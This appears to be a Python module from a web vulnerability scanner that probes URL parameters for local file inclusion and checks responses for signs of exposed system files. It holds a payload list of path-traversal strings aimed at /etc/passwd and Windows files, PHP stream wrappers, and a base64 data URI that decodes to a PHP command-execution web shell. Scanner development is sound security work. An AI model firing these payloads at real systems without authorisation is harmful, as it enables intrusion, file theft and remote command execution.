import re
import requests
from urllib.parse import urlparse, parse_qs, urlencode
from config import DEFAULT_TIMEOUT
from modules.vuln.waf_aware_classifier import classify_signature_match

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    "/etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
]

LFI_INDICATORS = [
    "root:x:0:0",
    "daemon:x:",
    "/bin/bash",
    "/bin/sh",
    "[fonts]",
    "[extensions]",
    "127.0.0.1",
    "localhost",
]

# "127.0.0.1"/"localhost" show up in countless ordinary pages (config blurbs,
# dev-mode banners, contact footers...) with zero relation to a real LFI —
# unlike the other indicators above they are not evidence of file content by
# themselves. Trusting a match on one of these requires the body to also
# contain the actual multi-field structure of a real /etc/passwd or
# windows\win.ini, not just the bare word.
LFI_WEAK_INDICATORS = {"127.0.0.1", "localhost"}

# Real /etc/passwd lines: name:x:uid:gid:gecos:home:shell
_PASSWD_STRUCTURE_RE = re.compile(r"^[a-zA-Z_][\w-]*:x:\d+:\d+:[^\n:]*:[^\n:]*:[^\n:]*$", re.MULTILINE)
# Real win.ini: a [fonts]/[extensions] section header followed by key=value entries
_INI_STRUCTURE_RE = re.compile(r"\[(?:fonts|extensions)\][^\[]{0,300}=", re.IGNORECASE)


def _looks_like_real_file_structure(body: str) -> bool:
    return bool(_PASSWD_STRUCTURE_RE.search(body or "") or _INI_STRUCTURE_RE.search(body or ""))


def _lfi_indicator_confirmed(body: str, matched_indicator: str) -> bool:
    """Weak/generic indicators need real file-structure evidence in the body
    before being trusted; the other, more specific indicators are trusted
    as-is (unchanged behavior)."""
    if matched_indicator not in LFI_WEAK_INDICATORS:
        return True
    return _looks_like_real_file_structure(body)


def scan_lfi(url: str) -> list:
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    file_params = [k for k in params if any(kw in k.lower() for kw in
                   ["file", "path", "page", "include", "template", "view", "doc", "load", "read"])]
    if not file_params:
        file_params = list(params.keys())[:3]

    session = requests.Session()
    session.headers["User-Agent"] = "OPTISEC-ReconPro/1.0 (Security Testing)"

    for param in file_params:
        # Only the CONFIRMED entry (if any) or the last non-reporting verdict
        # tried for this param is kept — one row per param, not one per
        # payload, so retaining WAF_BLOCKED/etc. doesn't multiply findings.
        pending = None
        for payload in LFI_PAYLOADS:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
            try:
                r = session.get(test_url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
                body = r.text
                matched_indicator = next((ind for ind in LFI_INDICATORS if ind in body), None)
                if matched_indicator and not _lfi_indicator_confirmed(body, matched_indicator):
                    matched_indicator = None
                result = classify_signature_match(
                    r.status_code, r.headers, r.text, matched_indicator,
                    severity="High", signal_label="LFI indicator",
                )
                entry = {
                    "type": "LFI",
                    "severity": result.severity,
                    "url": test_url,
                    "parameter": param,
                    "payload": payload,
                    "evidence": result.reason,
                    "waf_detected": result.waf_detected,
                    "verdict": result.verdict,
                    "status_code": r.status_code,
                    "response_body": r.text[:3000],
                }
                if result.verdict == "ENDPOINT_INVALID":
                    pending = entry  # path itself is unreachable, no point trying more payloads
                    break
                if result.should_report:
                    findings.append(entry)
                    pending = None
                    break
                pending = entry
            except Exception:
                continue
        if pending is not None:
            findings.append(pending)

    return findings
